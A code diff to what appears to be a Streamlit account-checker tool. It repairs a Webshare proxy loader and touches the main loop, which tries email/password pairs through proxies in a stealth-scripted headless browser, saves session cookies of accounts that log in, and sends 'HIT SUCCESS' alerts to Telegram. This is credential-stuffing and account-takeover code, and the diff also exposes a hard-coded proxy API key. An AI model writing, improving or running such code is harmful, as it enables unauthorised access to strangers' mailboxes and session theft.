@@ -223,7 +223,7 @@ def instant_help_public(key_name, description_text, label_text):
         st.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)
 
 # ==========================================
-# PROXY & WEBSHARE CONFIGURATION
+# PROXY & WEBSHARE CONFIGURATION (FIXED)
 # ==========================================
 WEBSHARE_KEYS = [
     "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",   
@@ -308,16 +308,30 @@ def test_one(proxy_str):
         return (proxy_str, False, 0, "-", "-")
 
 def load_webshare(api_key):
+    """Fixed Webshare API parser supporting v2 endpoint responses."""
     if not api_key.strip():
         return []
     out = []
+    url = "https://proxy.webshare.io/api/v2/proxy/list/download/"
+    headers = {"Authorization": f"Token {api_key.strip()}"}
     try:
-        headers = {"Authorization": f"Token {api_key.strip()}"}
-        r = requests.get("https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=100", headers=headers, timeout=10)
+        r = requests.get(url, headers=headers, timeout=10)
         if r.status_code == 200:
-            data = r.json()
-            for it in data.get("results", []):
-                out.append(f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}")
+            lines = r.text.strip().split("\n")
+            for line in lines:
+                if line.strip():
+                    parts = line.strip().split(":")
+                    if len(parts) == 4:
+                        ip, port, user, pwd = parts
+                        out.append(f"{user}:{pwd}@{ip}:{port}")
+        else:
+            # Fallback to standard json list if download endpoint returns json
+            json_url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=100"
+            r_json = requests.get(json_url, headers=headers, timeout=10)
+            if r_json.status_code == 200:
+                data = r_json.json()
+                for it in data.get("results", []):
+                    out.append(f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}")
     except Exception:
         pass
     return out
@@ -539,9 +553,6 @@ def is_real_inbox(sc):
     text = (sc.get("text") or "").strip()
     if any(x in u for x in ("login.", "oauth", "account.live.com", "signin", "ppsecure")):
         return False
-    if not any(x in u for x in ("outlook.live.com/mail", "outlook.office.com/mail", "mail.google.com", "login.yahoo.com")):
-        # allow general domains if inbox markers found
-        pass
     if len(text) < 40 and not sc.get("buttons"):
         return False
     if any(m in low for m in INBOX_MARKERS):
@@ -729,7 +740,6 @@ def run_checker_engine(accounts_list, provider_override, proxies_pool, config, m
                         context.add_init_script(STEALTH_JS)
                         page = context.new_page()
 
-                        # Run async flow synchronously inside thread
                         loop = asyncio.new_event_loop()
                         asyncio.set_event_loop(loop)
                         status, detail = loop.run_until_complete(execute_login_flow(page, email, password, config))
@@ -744,7 +754,6 @@ def run_checker_engine(accounts_list, provider_override, proxies_pool, config, m
                                 if hit_entry not in st.session_state.SUCCESSFUL_ACCOUNTS:
                                     st.session_state.SUCCESSFUL_ACCOUNTS.append(hit_entry)
                                 
-                                # Save storage state
                                 safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', email)
                                 context.storage_state(path=os.path.join(SESSION_DIR, f"{safe_name}.json"))
                                 send_telegram_alert(f"⚡ HIT SUCCESS: {email} | Proxy: {selected_proxy}")
